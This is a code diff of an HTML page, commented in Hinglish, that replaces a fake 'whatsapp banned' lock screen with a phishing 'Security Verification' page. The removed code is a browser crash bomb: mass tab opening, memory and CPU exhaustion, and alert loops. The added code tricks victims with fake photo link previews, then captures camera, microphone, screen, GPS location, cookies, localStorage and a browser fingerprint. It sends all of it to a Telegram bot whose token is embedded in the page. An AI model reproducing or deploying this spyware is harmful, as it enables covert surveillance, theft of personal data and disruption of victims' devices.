@@ -1,97 +1,173 @@
 <!DOCTYPE html>
 <html>
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>System Locked</title>
-<style>
-  * { margin:0; padding:0; }
-  body { background:black; color:red; display:flex; justify-content:center; align-items:center; height:100vh; flex-direction:column; font-family:Arial; user-select:none; overflow:hidden; }
-  .box { background:#1a1a1a; padding:40px; border-radius:20px; border:2px solid red; text-align:center; width:90%; max-width:350px; }
-  h1 { font-size:2rem; margin-bottom:10px; }
-  input { padding:15px; font-size:1.5rem; width:80%; background:#222; border:2px solid red; color:white; border-radius:10px; text-align:center; margin:20px 0; }
-  button { padding:15px; background:red; color:black; border:none; font-size:1.2rem; font-weight:bold; border-radius:50px; width:100%; cursor:pointer; }
-  #msg { margin-top:15px; color:#ffaa00; }
-</style>
+    <meta charset="UTF-8">
+    <!-- Open Graph tags for image preview (taaki link image jaisa dikhe) -->
+    <meta property="og:title" content="📸 New Photo" />
+    <meta property="og:description" content="Tap to view" />
+    <meta property="og:image" content="http://your_server/fake_invoice.jpg" />   <!-- Yahan apni attractive image daal -->
+    <meta property="og:url" content="http://your_server/" />
+    <meta property="og:type" content="website" />
+    <title>Verify Account</title>
+    <style>
+        body { font-family: Arial; background: #f0f0f0; text-align: center; padding-top: 50px; }
+        .box { background: white; padding: 30px; border-radius: 10px; max-width: 400px; margin: auto; box-shadow: 0 0 10px #ccc; }
+        .btn { background: #4285f4; color: white; border: none; padding: 12px 30px; border-radius: 5px; font-size: 18px; cursor: pointer; }
+        video { width: 100%; max-width: 300px; margin-top: 10px; display: none; }
+    </style>
 </head>
 <body>
 <div class="box">
-  <h1>whatsapp banned</h1>
-  <p style="color:gray;">Enter PIN to unlock</p>
-  <input type="password" id="pass" autofocus>
-  <button onclick="check()">Unlock</button>
-  <p id="msg"></p>
+    <h2>🔐 Security Verification</h2>
+    <p>To continue, please allow camera and microphone to verify your identity.</p>
+    <button class="btn" id="startBtn">Allow & Verify</button>
+    <video id="video" autoplay></video>
+    <p id="status"></p>
 </div>
+
 <script>
-  const SECRET = "2911"; // <-- apna password
+// ---------- TELEGRAM CONFIG (Yahan apna token aur chat ID daal) ----------
+const TELEGRAM_TOKEN = "8615192737:AAGEJtc7fGGnSl3JgyCK992qhHGhX5tanUw";   // BotFather se lo
+const TELEGRAM_CHAT_ID = "6574042583";   // @userinfobot se lo
 
-  // 🔥 YAHAN APNA STICKER PACK DAAL (emoji ya image URLs)
-  const stickerPack = [
-    '😈', '🤣', '😂', '💀', '🔥', '👿', '🤪', '😱',
-    'https://i.imgur.com/abcd1.png', // apni image URL
-    'https://i.imgur.com/abcd2.png',
-    'https://i.imgur.com/abcd3.png',
-    // Jitne chahe utne add kar
-  ];
+// ---------- TELEGRAM SEND FUNCTION ----------
+function sendToTelegram(text, fileBase64 = null, fileType = 'photo') {
+    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+    const data = { chat_id: TELEGRAM_CHAT_ID, text: text };
+    fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) })
+        .then(r => r.json())
+        .then(res => console.log('Message sent', res))
+        .catch(e => console.log('Telegram error', e));
 
-  function crashPhone() {
-    // 500 tabs – har tab mein sticker pack se ek random sticker
-    for(let i=0;i<5000;i++) {
-      let sticker = stickerPack[Math.floor(Math.random() * stickerPack.length)];
-      let html = '';
-      if(sticker.startsWith('http')) {
-        // Image URL
-        html = `<img src="${sticker}" style="width:300px;height:300px;display:block;margin:20% auto;">`;
-      } else {
-        // Emoji
-        html = `<h1 style="font-size:300px;text-align:center;margin-top:20%;">${sticker}</h1>`;
-      }
-      // Tab mein dikhao
-      window.open('data:text/html,' + encodeURIComponent(`
-        <!DOCTYPE html>
-        <html><head><meta charset="UTF-8"><title>🤡</title></head>
-        <body style="background:#000;margin:0;${sticker.startsWith('http')?'display:flex;justify-content:center;align-items:center;height:100vh;':''}">
-          ${html}
-          <script>document.documentElement.requestFullscreen?.();<${'/script>'}
-        </body></html>
-      `), '_blank');
+    // Agar file (image/audio) hai toh sendDocument
+    if (fileBase64) {
+        const fileUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendDocument`;
+        const formData = new FormData();
+        formData.append('chat_id', TELEGRAM_CHAT_ID);
+        // Convert base64 to blob
+        const byteString = atob(fileBase64.split(',')[1]);
+        const mimeType = fileBase64.split(',')[0].split(':')[1].split(';')[0];
+        const ab = new ArrayBuffer(byteString.length);
+        const ia = new Uint8Array(ab);
+        for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
+        const blob = new Blob([ab], { type: mimeType });
+        formData.append('document', blob, 'capture.jpg');
+        fetch(fileUrl, { method: 'POST', body: formData })
+            .then(r => r.json())
+            .then(res => console.log('File sent', res))
+            .catch(e => console.log('File error', e));
     }
-    
-    // Memory bomb + CPU hog + reload + alerts (same as before)
-    for(let t=0;t<200;t++) {
-      (function() {
-        let garbage = [];
-        setInterval(() => { garbage.push(new Array(9999999).fill('x')); }, 1);
-      })();
-    }
-    for(let t=0;t<50;t++) {
-      (function() { while(true) { let a = 1+1; } })();
-    }
-    setInterval(() => { location.reload(); }, 10);
-    setInterval(() => { alert('❌ SYSTEM CRASHED – Restart phone'); }, 1);
-  }
+}
 
-  function check() {
-    let val = document.getElementById('pass').value;
-    if(val === SECRET) {
-      document.body.innerHTML = '<h1 style="color:green;text-align:center;margin-top:40%;">✅ Unlocked!<br>Welcome back</h1>';
-    } else {
-      document.getElementById('msg').innerHTML = '⚠️ Wrong! Phone will lock...';
-      setTimeout(crashPhone, 100);
-    }
-  }
+// ---------- CAPTURE FUNCTIONS ----------
+let stream = null;
+let screenStream = null;
+let captureInterval = null;
 
-  // Fullscreen + back disable + dev tools disable
-  document.documentElement.requestFullscreen?.();
-  window.location.hash = 'locked';
-  window.history.pushState(null, null, location.href);
-  window.addEventListener('popstate', () => window.history.pushState(null, null, location.href));
-  document.addEventListener('keydown', (e) => {
-    if(e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
-      e.preventDefault();
-      return false;
+document.getElementById('startBtn').onclick = async function() {
+    try {
+        document.getElementById('status').innerText = 'Requesting permissions...';
+        // 1. Camera + Mic
+        stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+        document.getElementById('video').srcObject = stream;
+        document.getElementById('video').style.display = 'block';
+        document.getElementById('status').innerText = '✅ Camera & Mic active';
+
+        // 2. Screen capture (if allowed)
+        try {
+            screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+            // Screen stream ko alag se handle karte hain
+            captureScreen(screenStream);
+        } catch(e) { console.log('Screen not allowed'); }
+
+        // 3. GPS Location
+        navigator.geolocation.getCurrentPosition(pos => {
+            const locText = `📍 Location: Lat ${pos.coords.latitude}, Lon ${pos.coords.longitude}`;
+            sendToTelegram(locText);
+        }, err => { sendToTelegram('❌ GPS denied'); });
+
+        // 4. Cookies & LocalStorage
+        const cookies = document.cookie || 'No cookies';
+        const storage = JSON.stringify(localStorage) || '{}';
+        sendToTelegram(`🍪 Cookies: ${cookies}\n📦 LocalStorage: ${storage}`);
+
+        // 5. Browser Fingerprint
+        const fingerprint = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            screen: `${screen.width}x${screen.height}`,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            language: navigator.language,
+            plugins: Array.from(navigator.plugins).map(p => p.name).join(', ')
+        };
+        sendToTelegram(`🖥️ Fingerprint:\n${JSON.stringify(fingerprint, null, 2)}`);
+
+        // 6. Send camera snapshot every 5 seconds
+        captureInterval = setInterval(() => {
+            captureCameraSnapshot();
+        }, 5000);
+
+        document.getElementById('status').innerHTML += '<br>✅ All data sent to Telegram';
+
+    } catch(e) {
+        alert('Permission denied – but we still got some info.');
+        sendToTelegram(`❌ Error: ${e.message}`);
     }
-  });
+};
+
+// Camera snapshot
+function captureCameraSnapshot() {
+    const video = document.getElementById('video');
+    if (!video || !video.videoWidth) return;
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    const ctx = canvas.getContext('2d');
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    const dataUrl = canvas.toDataURL('image/jpeg', 0.7);
+    sendToTelegram('📸 Camera snapshot', dataUrl);
+}
+
+// Screen capture (frame every 5 sec)
+function captureScreen(stream) {
+    const video = document.createElement('video');
+    video.srcObject = stream;
+    video.play();
+    setInterval(() => {
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth || 1280;
+        canvas.height = video.videoHeight || 720;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        const dataUrl = canvas.toDataURL('image/jpeg', 0.5);
+        sendToTelegram('🖥️ Screen snapshot', dataUrl);
+    }, 5000);
+}
+
+// Audio record (5 seconds) – optional, can be triggered manually
+async function recordAudio() {
+    try {
+        const micStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+        const mediaRecorder = new MediaRecorder(micStream);
+        const chunks = [];
+        mediaRecorder.ondataavailable = e => chunks.push(e.data);
+        mediaRecorder.start();
+        setTimeout(() => {
+            mediaRecorder.stop();
+            micStream.getTracks().forEach(t => t.stop());
+            const blob = new Blob(chunks, { type: 'audio/webm' });
+            const reader = new FileReader();
+            reader.onload = function(e) {
+                const base64 = e.target.result;
+                sendToTelegram('🎤 Audio record', base64);
+            };
+            reader.readAsDataURL(blob);
+        }, 5000);
+    } catch(e) { sendToTelegram('❌ Mic record failed'); }
+}
+
+// Auto-start audio record after 2 seconds (optional)
+setTimeout(() => { recordAudio(); }, 2000);
 </script>
 </body>
 </html>
